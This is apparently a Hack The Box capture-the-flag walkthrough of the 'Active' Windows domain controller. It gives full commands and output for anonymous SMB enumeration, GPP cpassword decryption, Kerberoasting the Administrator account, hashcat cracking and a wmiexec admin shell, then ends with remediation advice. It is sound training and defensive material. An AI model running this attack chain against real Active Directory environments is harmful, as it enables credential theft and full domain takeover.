---
title: Active - Walkthrough & Report
date: 02-12-2026
tags:
  - HTB
  - Windows
  - Easy
  - AD
---
![[Active_machine_image.png]]
# 🎯 Summary
Active is a Hack The Box machine focused on **Windows Active Directory (AD)**. It allows you to practice external exposed host services enumeration, SMB shares discovery and analysis and **Group Policy Preferences (GPP) credentials** cracking. The final objective is achieved via **vertical privilege escalation** by executing a Kerberoasting attack against a high-privileged account and cracking its hash to obtain the clear text password, **fully compromising** the target host.

The following tools were utilized to compromise the machine from initial access to root:
- [**Nmap:**](https://nmap.org) Services Discovery 
- **[NetExec](https://www.netexec.wiki/) / [Smbclient:](https://linux.die.net/man/1/smbclient)**:SMB Share Discovery and Interaction
- **[Impacket Get-GPPPassword:](https://github.com/fortra/impacket/blob/master/examples/Get-GPPPassword.py)** GPP Credentials Cracking
- **[Impacket GetUserSPNs:](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)** Kerberoasting Attack
- [**Hashcat:**](https://hashcat.net/hashcat/)Ticket Granting Service (TGS) Cracking
- [**Impacket Wmiexec:**](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) Remote access on the host

# 🔍 Reconnaissance
The first step is always to scan the services exposed by the target host to try to discover our **possible foothold** in the system.
Nmap is a great tool for this task:
```
$ nmap -Pn -n -p- -A 10.129.1.205 -oA Scans/active
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-12 09:23 +0100
Nmap scan report for 10.129.1.205
Host is up (0.020s latency).
Not shown: 65513 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-12 08:24:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
<SNIP>

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-12T08:25:21
|_  start_date: 2026-02-12T08:21:20
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   19.15 ms 10.10.14.1
2   19.44 ms 10.129.1.205

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.95 seconds
```

The Nmap scan returned that ports **53 (DNS**), ports **88, 464 (Kerberos)**, port **135 (WMI)**, ports **139, 445  (SMB)** and ports **389, 636, 3268 (LDAP)** are open and the underling host is running **Windows Server 2008 R2 SP1**.

The next step is to check whether is possibile to discover any SMB share possibly containing any **credentials or sensitive information**.
To do so we use the smbclient tool as an **anonymous user** to see if the command will return any result:
```
$ smbclient -NL //10.129.1.205/            
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
<SNIP>
```

The command **confirmed** that we have visibility on the host's SMB shares.
To identify the **privileges** granted as an anonymous user, we utilize the tool NetExec as follow:
```
$ nxc smb 10.129.1.205 -u "" -p "" --shares 
SMB         10.129.1.205    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.1.205    445    DC               [+] active.htb\: 
SMB         10.129.1.205    445    DC               [*] Enumerated shares
SMB         10.129.1.205    445    DC               Share           Permissions     Remark
SMB         10.129.1.205    445    DC               -----           -----------     ------
SMB         10.129.1.205    445    DC               ADMIN$                          Remote Admin
SMB         10.129.1.205    445    DC               C$                              Default share
SMB         10.129.1.205    445    DC               IPC$                            Remote IPC
SMB         10.129.1.205    445    DC               NETLOGON                        Logon server share 
SMB         10.129.1.205    445    DC               Replication     READ            
SMB         10.129.1.205    445    DC               SYSVOL                          Logon server share 
SMB         10.129.1.205    445    DC               Users                           
```

The command output confirmed that we have **READ privilege** on the "Replication" folder; that means we can explore its content.
Going back to smbclient, we access the "**Replication**" share and, looking for interesting files, we find and proceed to download the Group Policy Preferences (GPP) file "**Groups.xml**" under the path "\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml" 
```
$ smbclient //10.129.1.205/Replication
Password for [WORKGROUP\luca]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018
  
  <SNIP>
  
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018

                5217023 blocks of size 4096. 279193 blocks available
                
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml 
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (6,4 KiloBytes/sec) (average 6,4 KiloBytes/sec)
```

Opening the "Groups.xml" file it was possible to **discover credentials** for the domain service user SVC_TGS with the username field in clear text and the password stored in the cpassword XML field, encrypted with publicly known AES key published by Microsoft in 2012:
```
$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHxxhZLTjt/QS9FeIcJ83mjWA98gxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxfCuNH8pG5aSVYdYw/NgxxmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

# ⚔️ Exploitation
To obtain the **clear text value** of the encrypted password we can use Get-GPPPassword from the Impacket's tool collection, providing the XML file downloaded earlier:
```
$ python3 Get-GPPPassword.py local -xmlfile Groups.xml
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Found a Groups XML file:
[*]   file      : ../Groups.xml
[*]   newName   : 
[*]   userName  : active.htb\SVC_TGS
[*]   password  : GPxxxxxxxxxxxxxxxxxxxxxxx8
[*]   changed   : 2018-07-18 20:46:06
```

**Having our foothold in the domain** we can proceed to discover which privileges the account we compromised has on the SMB shares.
To do so we use again NetExec setting the SVC_TGS as the **impersonated user**:
```
$ nxc smb 10.129.1.205 -u "active.htb\SVC_TGS" -p "GPxxxxxxxxxxxxxxxxxxxxxxx8" --shares 
SMB         10.129.1.205    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
SMB         10.129.1.205    445    DC               [+] active.htb\SVC_TGS:GPxxxxxxxxxxxxxxxxxxxxxxx8 
SMB         10.129.1.205    445    DC               [*] Enumerated shares
SMB         10.129.1.205    445    DC               Share           Permissions     Remark
SMB         10.129.1.205    445    DC               -----           -----------     ------
SMB         10.129.1.205    445    DC               ADMIN$                          Remote Admin
SMB         10.129.1.205    445    DC               C$                              Default share
SMB         10.129.1.205    445    DC               IPC$                            Remote IPC
SMB         10.129.1.205    445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.1.205    445    DC               Replication     READ            
SMB         10.129.1.205    445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.1.205    445    DC               Users           READ            
```

NetExec output shows that we **gained READ permissions on three (3) new shares** that previously were not accessible as an anonymous user.
Searching in the new available shares we discover that only the "Users" shared folder contains an interesting file: "**user.txt**", the first flag,  at "\SVC_TGS\Desktop\user.txt":

```
$ smbclient -U "active.htb\SVC_TGS" //10.129.1.205/Users
Password for [ACTIVE.HTB\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
<SNIP>
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018

                5217023 blocks of size 4096. 278933 blocks available

<SNIP>

smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 17:14:42 2018
  ..                                  D        0  Sat Jul 21 17:14:42 2018
  user.txt                           AR       34  Thu Feb 12 09:22:12 2026

                5217023 blocks of size 4096. 278933 blocks available
smb: \SVC_TGS\Desktop\> get user.txt 
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)

smb: \SVC_TGS\Desktop\> !cat user.txt 
15ffxxxxxxxxxxxxxxxxxxxxxxxx1910
```

# 🚩 Post-Exploitation
Obtained the first flag, our attention goes to compromise the target host at root-level.
As showed previously in the Nmap output **Kerberos service is active** and the name of the discovered user is a great hint about the next move.
We decide to take advantage of the SVC_TGS account to enumerate all the domain users having the **ServicePrincipalName (SPN) attribute set** through the Impacket's GetUserSPNs tool:
```
$ impacket-GetUserSPNs -target-domain active.htb -dc-ip 10.129.1.205 active.htb/SVC_TGS  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-02-12 09:22:14.426932
```

The tool shows that a domain high-level account, **Administrator**, has the SPN attribute set. We proceed to request and afterwards save in a file its Ticket Granting Service (TGS), encrypted with the **user NTLM password hash**, to parse it offline trying to obtain its clear text value.
```
$ impacket-GetUserSPNs -target-domain active.htb -dc-ip 10.129.1.205 active.htb/SVC_TGS -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-02-12 09:22:14.426932             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$758591bf8262c9461e958ac4...<SNIP>...5924af364e5ba8cd9765e93


$ impacket-GetUserSPNs -target-domain active.htb -dc-ip 10.129.1.205 active.htb/SVC_TGS -request -outputfile administrator_TGS_hash
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
<SNIP>

```

To accomplish this task we can choose to utilize a tool between John The Ripper and Hashcat. Having Hashcat the ability to take advantage of the **GPU** to speedup cracking passwords tasks, we utilize it to obtain the clear text Administrator's password in about **34 seconds**:
```
$ hashcat -m 13100 administrator_TGS_hash /usr/share/wordlists/rockyou.txt.gz -D 1,2 
hashcat (v7.1.2) starting

<SNIP>

Host memory allocated for this attack: 558 MB (11125 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$def6f23603aac5849098a13ead8f9861$30e63092befb6643980185b32a811aaf1bd5b6cfb6e9bbbaa99f86ee886f507ebe31309f796e...<SNIP>...2753559735d45ecf9359256d8545d73ced93b9b6d8873c6a6e69f39b26457426060165215f3e251c5f095bdfba536b3bc5f3290b2242ce6f6df8d9e51856afe30ddceccd9203572f0ea9ff8ac4a027aa775826c2a5d069b32022c88bade:Txxxxxxxxxxxxxx8
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...88bade
Time.Started.....: Thu Feb 12 12:27:30 2026 (3 secs)
Time.Estimated...: Thu Feb 12 12:27:33 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2649.9 kH/s (11.66ms) @ Accel:537 Loops:1 Thr:32 Vec:1
Speed.#03........:  1565.9 kH/s (2.30ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Speed.#*.........:  4215.8 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539808/14344385 (73.48%)
Rejected.........: 0/10539808 (0.00%)
Restore.Point....: 10490656/14344385 (73.13%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: abeja1 -> Wiwatthana
Candidates.#03...: Torenlaan -> TheArkeliu
Hardware.Mon.#01.: Temp: 51c Util: 17% Core:1097MHz Mem:2505MHz Bus:8
Hardware.Mon.#03.: Temp: 75c Util: 54%

Started: Thu Feb 12 12:27:00 2026
Stopped: Thu Feb 12 12:27:34 2026
```

Obtained the domain Administrator account's credentials, we can use the Impacket's tool Wmiexec to start a **semi-interactive shell** on the target host, which we can use to explore the Administrator Desktop folder where we expect to find the **final flag**:
```
$ impacket-wmiexec administrator:Txxxxxxxxxxxxxx8@10.129.1.205
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
DC

C:\>whoami
active\administrator

C:\>dir C:\Users\Administrator\Desktop\
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

21/01/2021  06:49 ��    <DIR>          .
21/01/2021  06:49 ��    <DIR>          ..
12/02/2026  10:22 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.142.378.496 bytes free
```

Obtained the confirmation that the root flag is where we thought it would be, the last step to complete the machine is open the "**root.txt**" file:
```
C:\>type C:\Users\Administrator\Desktop\root.txt
312axxxxxxxxxxxxxxxxxxxxxxxx29cc
```

# 🛠️ Remediation
The following points shortly illustrates actions required to secure the environment.
### 1. Legacy Group Policy Preferences (GPP)
- **Security Patching:** Apply the [Microsoft MS14-025](https://learn.microsoft.com) update to prevent the storage of passwords in Group Policy preference files.
- **Credential Cleanup:** Manually audit and delete legacy `Groups.xml` files containing `cpassword` fields from the `SYSVOL` and `Replication` shares.
- **Access Control:** Restrict anonymous/guest access to network shares to prevent unauthenticated enumeration of sensitive configuration files.

### 2. Service Account Vulnerability (Kerberoasting)
- **Password Hardening:** Enforce high-entropy password policies (25+ characters) for accounts with Service Principal Names (SPNs) to make offline cracking computationally unfeasible.
- **Identity Migration:** Transition to [Group Managed Service Accounts (gMSAs)](https://learn.microsoft.com), which utilize complex, system-managed passwords that rotate automatically.
- **Active Monitoring:** Implement detection for [Honeytokens](https://www.microsoft.com) and alert on abnormal volumes of TGS-REQ (Event ID 4769) to identify service ticket harvesting.

### 3. Remote Management Security (WMI)
- **Network Segmentation:** Restrict WMI and RPC traffic via host-based firewalls (e.g., [Windows Defender Firewall](https://learn.microsoft.com)) to authorized administrative subnets only.
- **Privilege Management:** Ensure domain administrator accounts are only used on Tier 0 assets to prevent credential exposure on compromised workstations.
- **Secure Alternatives:** Transition to [Windows Admin Center](https://learn.microsoft.com) or PowerShell Remoting (WinRM) over HTTPS for encrypted and more easily auditable remote administration.


> [!CAUTION] Penetration Test Report (PDF)
> Please send me a message on [Linkedin](https://www.linkedin.com/in/luca-albertazzi-77073b61)to obtain the PDF report link.



